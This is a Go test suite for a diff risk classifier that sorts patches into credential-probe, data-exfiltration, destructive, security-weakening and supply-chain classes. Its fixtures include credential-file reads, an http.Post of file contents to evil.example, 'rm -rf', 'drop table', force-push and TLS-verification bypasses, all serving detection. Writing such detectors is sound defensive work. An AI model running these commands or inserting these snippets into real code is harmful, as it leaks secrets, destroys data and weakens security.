package ipc

// fix-INT W5: the Guardian risk classifier battery (design lock
// docs/design/fix-int-w5-risk-taxonomy-lock.md): per-class triggers,
// severity rank, added-line-only discipline, the docs/clean "none"
// floor, the unreadable-patch receipt omission, and the
// autoLandSupplyChainFiles SSOT pin (no second list).

import (
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// riskyPatch builds a one-file unified diff whose hunk body lines are
// given verbatim (each entry carries its + / - / space prefix). The hunk
// header is sized to match the body so downstream parsers stay well-fed.
func riskyPatch(path string, isNew bool, body ...string) string {
	var adds, dels int
	for _, l := range body {
		if strings.HasPrefix(l, "+") {
			adds++
		} else if strings.HasPrefix(l, "-") {
			dels++
		}
	}
	ctx := len(body) - adds - dels
	oldStart, oldN, newStart, newN := 1, dels+ctx, 1, adds+ctx
	if isNew {
		oldStart, oldN = 0, 0
	}
	var b strings.Builder
	fmt.Fprintf(&b, "diff --git a/%s b/%s\n", path, path)
	if isNew {
		b.WriteString("new file mode 100644\n--- /dev/null\n")
	} else {
		fmt.Fprintf(&b, "--- a/%s\n", path)
	}
	fmt.Fprintf(&b, "+++ b/%s\n@@ -%d,%d +%d,%d @@\n", path, oldStart, oldN, newStart, newN)
	for _, l := range body {
		b.WriteString(l + "\n")
	}
	return b.String()
}

// TestClassifyRiskPerClassTriggers: every class on its trigger shape,
// including the per-hunk scoping of data_exfil and the case rules of the
// supplied snippets.
func TestClassifyRiskPerClassTriggers(t *testing.T) {
	for _, tc := range []struct {
		name         string
		diff         string
		wantClasses  []string
		wantEvidence string // substring of evidence[class]; "" = no assertion
	}{
		{
			name: "credential probe: getenv-shaped read of *_KEY",
			diff: riskyPatch("src/sse.go", false,
				" package src",
				`+	key := os.Getenv("AWS_SECRET_ACCESS_KEY")`),
			wantClasses:  []string{"credential_probe"},
			wantEvidence: `os.Getenv("AWS_SECRET_ACCESS_KEY") @src/sse.go:2`,
		},
		{
			name: "credential probe: *_TOKEN via process.env",
			diff: riskyPatch("src/app.ts", false,
				`+	const t = process.env.SUDO_CODING_TOKEN`),
			wantClasses:  []string{"credential_probe"},
			wantEvidence: "process.env.SUDO_CODING_TOKEN",
		},
		{
			name: "credential probe: ssh private key path",
			diff: riskyPatch("src/key.go", true,
				`+const k = "~/.ssh/id_ed25519"`),
			wantClasses:  []string{"credential_probe"},
			wantEvidence: ".ssh/id_",
		},
		{
			name: "credential probe: .aws/credentials literal",
			diff: riskyPatch("deploy.sh", false,
				"+cat ~/.aws/credentials"),
			wantClasses:  []string{"credential_probe"},
			wantEvidence: ".aws/credentials",
		},
		{
			name: "credential probe: keychain",
			diff: riskyPatch("tools/keydump.m", false,
				"+dump it from Keychain now"),
			wantClasses:  []string{"credential_probe"},
			wantEvidence: "Keychain",
		},
		{
			name: "credential probe: unsafe name alone never trips",
			diff: riskyPatch("src/cfg.go", false,
				`+	maxConnKey := 3 // MAX_CONN_KEY is a struct field here, not an env read`),
			wantClasses: []string{"none"},
		},
		{
			name: "credential probe: env name without getenv shape never trips",
			diff: riskyPatch("src/cfg.go", false,
				`+	// plumbed below`,
				`+	x := config.AWS_SECRET_ACCESS_KEY`),
			wantClasses: []string{"none"},
		},
		{
			name: "credential probe: comment carrying a getenv call never trips",
			diff: riskyPatch("src/cfg.go", false,
				`+	// reads os.Getenv("AWS_SECRET_ACCESS_KEY") upstream`),
			wantClasses: []string{"none"},
		},
		{
			name: "data exfil: local read + egress in one hunk",
			diff: riskyPatch("src/collect.go", false,
				`+	payload, _ := os.ReadFile("/etc/hostname")`,
				`+	_ = payload`,
				`+	http.Post("https://collector.example/x", "text/plain", nil)`),
			wantClasses:  []string{"data_exfil"},
			wantEvidence: "os.ReadFile(\"/etc/hostname\") → http.Post(\"https://collector.example/x\"",
		},
		{
			name: "data exfil: read in one hunk, egress in a LATER hunk stays clean",
			diff: strings.Join([]string{
				"diff --git a/src/two.go b/src/two.go",
				"--- a/src/two.go",
				"+++ b/src/two.go",
				"@@ -1,0 +1 @@",
				`+	v, _ := os.ReadFile("/tmp/a")`,
				"@@ -40,0 +41 @@",
				`+	http.Post("https://example.com/x", "text/plain", nil)`,
				"",
			}, "\n"),
			wantClasses: []string{"none"},
		},
		{
			name: "data exfil: egress alone never trips",
			diff: riskyPatch("src/net.go", false,
				`+	http.Get("https://example.com/healthz")`),
			wantClasses: []string{"none"},
		},
		{
			name:         "destructive: deleted file in the patch",
			diff:         "diff --git a/src/old.go b/src/old.go\ndeleted file mode 100644\n--- a/src/old.go\n+++ /dev/null\n@@ -1,1 +0,0 @@\n-package src\n",
			wantClasses:  []string{"destructive"},
			wantEvidence: "src/old.go (file deleted)",
		},
		{
			name: "destructive: RemoveAll in an added line",
			diff: riskyPatch("src/wipe.go", false,
				`+	os.RemoveAll(root)`),
			wantClasses:  []string{"destructive"},
			wantEvidence: "os.RemoveAll(root)",
		},
		{
			name: "destructive: rm -rf shell",
			diff: riskyPatch("scripts/clean.sh", false,
				`+rm -rf "$OUT"`),
			wantClasses:  []string{"destructive"},
			wantEvidence: "rm -rf",
		},
		{
			name: "destructive: DROP TABLE case-insensitive",
			diff: riskyPatch("db/migrate.sql", false,
				"+drop table users;"),
			wantClasses:  []string{"destructive"},
			wantEvidence: "drop table users",
		},
		{
			name: "destructive: force push / hard reset",
			diff: riskyPatch("scripts/ship.sh", false,
				"+git push --force origin main",
				"+git reset --hard HEAD~4"),
			wantClasses:  []string{"destructive"},
			wantEvidence: "push --force",
		},
		{
			name: "destructive: comment mentioning rm -rf never trips",
			diff: riskyPatch("src/doc.go", false,
				`+	// never do rm -rf here`),
			wantClasses: []string{"none"},
		},
		{
			name: "security weakening: InsecureSkipVerify",
			diff: riskyPatch("src/http.go", false,
				`+	tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}`),
			wantClasses:  []string{"security_weakening"},
			wantEvidence: "InsecureSkipVerify",
		},
		{
			name: "security weakening: //nosec survives the comment filter BY DESIGN",
			diff: riskyPatch("src/x.go", false,
				`+	key, _ := hex.DecodeString(s) //nosec G101`),
			wantClasses:  []string{"security_weakening"},
			wantEvidence: "//nosec",
		},
		{
			name: "security weakening: chmod 777",
			diff: riskyPatch("scripts/p.sh", false,
				"+chmod 777 /var/lib/app"),
			wantClasses:  []string{"security_weakening"},
			wantEvidence: "chmod 777",
		},
		{
			name: "security weakening: CORS wildcard",
			diff: riskyPatch("src/cors.go", false,
				`+	w.Header().Set("Access-Control-Allow-Origin", "*")`),
			wantClasses:  []string{"security_weakening"},
			wantEvidence: "Access-Control-Allow-Origin",
		},
		{
			name: "security weakening: auth disable",
			diff: riskyPatch("server.ini", false,
				"+auth = false"),
			wantClasses:  []string{"security_weakening"},
			wantEvidence: "auth = false",
		},
		{
			name: "security weakening: comment about chmod never trips",
			diff: riskyPatch("src/p.go", false,
				"+// run chmod 777 here if desperate"),
			wantClasses: []string{"none"},
		},
		{
			name: "supply chain: top-level lockfile",
			diff: riskyPatch("go.sum", false,
				"-old hash",
				"+new hash"),
			wantClasses:  []string{"supply_chain"},
			wantEvidence: "go.sum (supply-chain manifest/lockfile)",
		},
		{
			name: "supply chain: nested manifest, case-insensitive",
			diff: riskyPatch("gui/Package.JSON", false,
				"+{}"),
			wantClasses:  []string{"supply_chain"},
			wantEvidence: "gui/Package.JSON",
		},
		{
			name:         "supply chain: mode-only change caught via the header",
			diff:         "diff --git a/requirements.txt b/requirements.txt\nold mode 100644\nnew mode 100755\n",
			wantClasses:  []string{"supply_chain"},
			wantEvidence: "requirements.txt",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			classes, evidence := classifyRisk(tc.diff)
			if !reflect.DeepEqual(classes, tc.wantClasses) {
				t.Fatalf("classes = %v, want %v (evidence %v)", classes, tc.wantClasses, evidence)
			}
			if tc.wantEvidence != "" {
				ev := evidence[classes[0]]
				if !strings.Contains(ev, tc.wantEvidence) {
					t.Errorf("evidence[%s] = %q, want substring %q", classes[0], ev, tc.wantEvidence)
				}
			}
			if len(tc.wantClasses) == 1 && tc.wantClasses[0] == "none" && len(evidence) != 0 {
				t.Errorf("clean diff carried evidence %v, want none", evidence)
			}
		})
	}
}

// TestClassifyRiskSeverityOrder: a multi-hit diff returns every class in
// the locked leak-cost rank (element 0 = the primary class), once each.
func TestClassifyRiskSeverityOrder(t *testing.T) {
	diff := "diff --git a/src/leak.go b/src/leak.go\n--- a/src/leak.go\n+++ b/src/leak.go\n@@ -1,0 +1,5 @@\n" +
		`+	key := os.Getenv("OPENAI_API_KEY")` + "\n" +
		`+	blob, _ := os.ReadFile("x")` + "\n" +
		`+	http.Post("https://evil.example", "text/plain", strings.NewReader(string(blob)))` + "\n" +
		`+	os.RemoveAll("/tmp/build")` + "\n" +
		`+	tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}` + "\n" +
		"diff --git a/go.mod b/go.mod\n--- a/go.mod\n+++ b/go.mod\n@@ -1,1 +1,1 @@\n-old\n+new\n"
	classes, evidence := classifyRisk(diff)
	want := []string{"credential_probe", "data_exfil", "destructive", "security_weakening", "supply_chain"}
	if !reflect.DeepEqual(classes, want) {
		t.Fatalf("classes = %v, want the exact severity rank %v", classes, want)
	}
	if len(evidence) != len(want) {
		t.Errorf("evidence keys = %v, want one per class", evidence)
	}
	// Repeat as env in a second diff order — hazard order, not file order,
	// decides. (supply_chain first in the text, still last in the rank.)
	reversed := riskyPatch("package.json", false, "+{}") + diff
	classes2, _ := classifyRisk(reversed)
	if !reflect.DeepEqual(classes2, want) {
		t.Errorf("reordered diff classes = %v, want unchanged rank %v", classes2, want)
	}
}

// TestClassifyRiskRemovedOnlyIsNotWeakening (lock): removing a
// weakening/destructive shape is an improvement — added-lines only.
func TestClassifyRiskRemovedOnlyIsNotWeakening(t *testing.T) {
	diff := riskyPatch("src/http.go", false,
		`-	tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}`,
		`-	key, _ := hex.DecodeString(s) //nosec G101`,
		`-	rm := exec.Command("rm", "-rf", dir)`,
		`-	chmod 777`,
		`+	tr.TLSClientConfig = &tls.Config{MinVersion: tls.VersionTLS13}`,
	)
	classes, evidence := classifyRisk(diff)
	if len(classes) != 1 || classes[0] != "none" {
		t.Errorf("classes = %v (evidence %v), want [none] — removals are improvements", classes, evidence)
	}
}

// TestClassifyRiskNoneForDocsDiff: a docs-only diff rates explicit
// "none" (the rated-clean posture; distinct from pre-W5 unrated).
func TestClassifyRiskNoneForDocsDiff(t *testing.T) {
	classes, evidence := classifyRisk(patchDoc("README.md", 3))
	if len(classes) != 1 || classes[0] != "none" {
		t.Errorf("classes = %v, want [none]", classes)
	}
	if len(evidence) != 0 {
		t.Errorf("evidence = %v, want empty for a clean diff", evidence)
	}
	// …and the receipt on the same bytes omits risk_evidence.
	receipt := riskReceiptKeys(patchDoc("README.md", 3))
	if _, ok := receipt["risk_class"]; !ok {
		t.Error("receipt missing risk_class on a clean diff — explicit-none is the contract")
	}
	if _, ok := receipt["risk_evidence"]; ok {
		t.Error("risk_evidence present on a clean diff — omitted when [none] is the contract")
	}
	if receipt["risk_classifier"] != "mechanical" {
		t.Errorf("risk_classifier = %v, want mechanical", receipt["risk_classifier"])
	}
}

// TestRiskReceiptUnreadablePatch (lock): an unreadable patch attests
// LESS — the empty receipt merges nothing (all three keys absent).
func TestRiskReceiptUnreadablePatch(t *testing.T) {
	if receipt := riskReceipt(filepath.Join(t.TempDir(), "missing.diff")); len(receipt) != 0 {
		t.Errorf("receipt = %v, want empty for an unreadable patch", receipt)
	}
}

// TestClassifyRiskSupplyChainMapSSOT (lock): the classifier reads
// autoLandSupplyChainFiles directly — a newly denied basename classifies
// supply_chain with NO second list to edit.
func TestClassifyRiskSupplyChainMapSSOT(t *testing.T) {
	diff := riskyPatch("vendor/odebian.lock", false, "+{}")
	if classes, _ := classifyRisk(diff); len(classes) != 1 || classes[0] != "none" {
		t.Fatalf("pre-map classes = %v, want [none] (basename not yet denied)", classes)
	}
	autoLandSupplyChainFiles["odebian.lock"] = true
	t.Cleanup(func() { delete(autoLandSupplyChainFiles, "odebian.lock") })
	classes, evidence := classifyRisk(diff)
	if len(classes) != 1 || classes[0] != "supply_chain" {
		t.Errorf("classes = %v, want [supply_chain] via the map — a second list would have missed this", classes)
	}
	if !strings.Contains(evidence["supply_chain"], "vendor/odebian.lock") {
		t.Errorf("evidence = %v, want the touched path", evidence)
	}
}

// TestRiskReceiptFromDisk: the on-disk receipt carries all three keys on
// a dirty patch, two on a clean one.
func TestRiskReceiptFromDisk(t *testing.T) {
	dir := t.TempDir()
	dirty := filepath.Join(dir, "dirty.diff")
	if err := os.WriteFile(dirty, []byte(riskyPatch("src/k.go", false,
		`+	k := os.Getenv("DB_PASSWORD")`)), 0o644); err != nil {
		t.Fatal(err)
	}
	receipt := riskReceipt(dirty)
	classes, _ := receipt["risk_class"].([]string)
	if len(classes) != 1 || classes[0] != "credential_probe" {
		t.Errorf("risk_class = %v, want [credential_probe]", receipt["risk_class"])
	}
	ev, _ := receipt["risk_evidence"].(map[string]string)
	if !strings.Contains(ev["credential_probe"], "DB_PASSWORD") {
		t.Errorf("risk_evidence = %v, want the trigger artifact", receipt["risk_evidence"])
	}
	clean := filepath.Join(dir, "clean.diff")
	if err := os.WriteFile(clean, []byte(patchDoc("README.md", 1)), 0o644); err != nil {
		t.Fatal(err)
	}
	if receipt := riskReceipt(clean); len(receipt) != 2 {
		t.Errorf("clean receipt keys = %v, want exactly risk_class + risk_classifier", receipt)
	}
}
